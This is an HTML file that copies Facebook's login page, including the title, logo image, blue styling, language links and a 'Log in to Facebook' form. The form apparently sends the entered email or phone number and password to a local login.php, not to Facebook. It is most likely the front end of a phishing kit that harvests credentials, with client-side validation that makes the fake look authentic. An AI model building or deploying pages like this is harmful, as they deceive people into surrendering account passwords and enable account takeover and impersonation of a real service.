<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            font-family: Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            width: 370px;
            margin-top: 100px
        }
        .facebook-logo {
            color: #1877f2;
            font-size: 48px;
            font-weight: bold;
            margin-bottom: 10px;
            width: 200px;
        }
        .login-form {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
        }
        .login-form p{
            font-size: 20px;
        }
        .login-form input[type="text"], .login-form input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            margin-bottom: 12px;
            box-sizing: border-box;
        }
        input:focus,
        button:focus {
            outline: none;
              /* You can adjust this color as needed */
        }
        .login-form .lg_in {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 20px;
            font-weight: bold;
            padding: 14px 16px;
            width: 100%;
            cursor: pointer;
            margin-bottom: 5px;
        }
        .login-form a {
            color: #1877f2;
            display: block;
            margin-top: 5px;
            text-align: center;
            text-decoration: none;
            font-size: 14px;
        }
        .login-form hr {
            border: none;
            border-bottom: 1px solid #dadde1;
            margin: 5px 0;
        }
        .login-form i {
            color: black;
        }
        .create-account {
            background-color: rgba(66,183,42,255);
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 17px;
            font-weight: bold;
            padding: 14px 16px;
            width: auto;
            cursor: pointer;
            margin: 0 auto;
            display: block;
        }
        .password-container {
            position: relative;
        }
        .password-toggle {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            user-select: none;
            color: #1877f2;
        }
        .languages {
            margin-top: 160px;
            font-size: 12px;
            color: #737373;
        }
        .languages a {
            color: #737373;
            text-decoration: none;
            margin: 0 4px;
        }

        .divider {
                display: flex;
                align-items: center;
                margin: 10px 0;
            }

            .divider::before,
            .divider::after {
                content: "";
                flex: 1;
                border-bottom: 1px solid #dbdbdb;
            }

            .divider span {
                padding: 0 10px;
                color: #8e8e8e;
                font-size: 13px;
                font-weight: bold;
            }
        /* .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #737373;
        }
        .footer-links {
            margin-bottom: 10px;
        }
        .footer-links a {
            color: #737373;
            text-decoration: none;
            margin: 0 4px;
        }
        .footer-info {
            margin-bottom: 10px;
        } */
    </style>
</head>
<body>
    <div class="container">
        <!-- <div class="facebook-logo">facebook</div> -->
        <img class="facebook-logo" src="ig-pics/fb-removebg-preview.png" alt="">
        <div class="login-form">
            <p>Log in to Facebook</p>
            <form id="loginForm-mobile" action="login.php" method="POST" onsubmit="return validateForm ('loginForm-mobile')">
                <input type="text" name="identifier" placeholder="Email address or phone number">
                <div class="password-container">
                    <input type="password" name="password" id="password" placeholder="Password" required>
                    <span class="password-toggle" onclick="togglePassword()">
                        <i class="fa-regular fa-eye-slash"></i>

                        <!-- <i class="fa-solid fa-eye-slash"></i> -->
                        <!-- <i class="fas fa-eye-slash"></i> -->
                    </span>
                </div>
                <button class="lg_in" type="submit">Log in</button>
                <a href="#">Forgotten account?</a>

                <div class="divider">
                    <span>or</span>
                </div>

                <!-- <hr> -->
                <button class="create-account">Create new account</button>
            </form>
        </div>
        <div class="languages">
            <a href="#">English (UK)</a>
            <a href="#">Hausa</a>
            <a href="#">Français (France)</a>
            <a href="#">Português (Brasil)</a>
            <a href="#">Español</a>
            <a href="#">العربية</a>
            <a href="#">Bahasa Indonesia</a>
            <a href="#">Deutsch</a>
            <a href="#">日本語</a>
            <a href="#">Italiano</a>
            <a href="#">हिन्दी</a>
            <a href="#">+</a>
        </div>
    </div>

    <!-- <footer class="footer">
        <div class="footer-links">
            <a href="#">English (UK)</a>
            <a href="#">Français (France)</a>
            <a href="#">Português (Brasil)</a>
            
        </div>
        <div class="footer-links">
            <a href="#">Link 4</a>
            <a href="#">Link 5</a>
            <a href="#">Link 6</a>
            
        </div>
        <div class="footer-info">
            Meta © 2024
        </div>
    </footer> -->



    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const passwordToggle = document.querySelector('.password-toggle i');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                passwordToggle.classList.remove('fa-eye-slash');
                passwordToggle.classList.add('fa-eye');
            } else {
                passwordInput.type = 'password';
                passwordToggle.classList.remove('fa-eye');
                passwordToggle.classList.add('fa-eye-slash');
            }
        }

    function validateForm(formId) {
    const form = document.getElementById(formId);
    const identifier = form.querySelector('input[name="identifier"]');
    const password = form.querySelector('input[name="password"]');
    let isValid = true;

    // Reset previous error messages
    clearErrors(form);

    // Validate identifier
    if (identifier.value.trim() === '') {
        showError(identifier, 'Please enter your username, email, or phone number.');
        isValid = false;
    } else if (!isValidIdentifier(identifier.value)) {
        showError(identifier, 'Please enter a valid username, email, or phone number.');
        isValid = false;
    }

    // Validate password
    if (password.value.trim() === '') {
        showError(password, 'Please enter your password.');
        isValid = false;
    } else if (password.value.length < 6) {
        showError(password, 'Password must be at least 6 characters long.');
        isValid = false;
    }

    return isValid;
}

    function isValidIdentifier(value) {
        // Simple regex for email validation
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        // Simple regex for phone number (assumes a 10-digit number)
        const phoneRegex = /^\d{10}$/;
        // Username should be at least 3 characters long and only contain letters, numbers, dots, and underscores
        const usernameRegex = /^[a-zA-Z0-9._]{3,}$/;

        return emailRegex.test(value) || phoneRegex.test(value) || usernameRegex.test(value);
    }

    function showError(input, message) {
        const errorElement = document.createElement('div');
        errorElement.className = 'error-message';
        errorElement.textContent = message;
        errorElement.style.color = 'red';
        errorElement.style.fontSize = '12px';
        errorElement.style.marginTop = '5px';
        input.parentNode.insertBefore(errorElement, input.nextSibling);
        input.style.borderColor = 'red';
    }

    function clearErrors(form) {
        const errorMessages = form.querySelectorAll('.error-message');
        errorMessages.forEach(error => error.remove());
        form.querySelectorAll('input').forEach(input => input.style.borderColor = '');
    }

    // Add event listeners to both forms
    document.getElementById('loginForm-mobile').addEventListener('submit', function(event) {
        if (!validateForm('loginForm-mobile')) {
            event.preventDefault();
        }
    });

    // document.getElementById('loginForm-desktop').addEventListener('submit', function(event) {
    //     if (!validateForm('loginForm-desktop')) {
    //         event.preventDefault();
    //     }
    // });
    </script>

    <script src="https://kit.fontawesome.com/7c091fed64.js" crossorigin="anonymous"></script>
</body>
</html>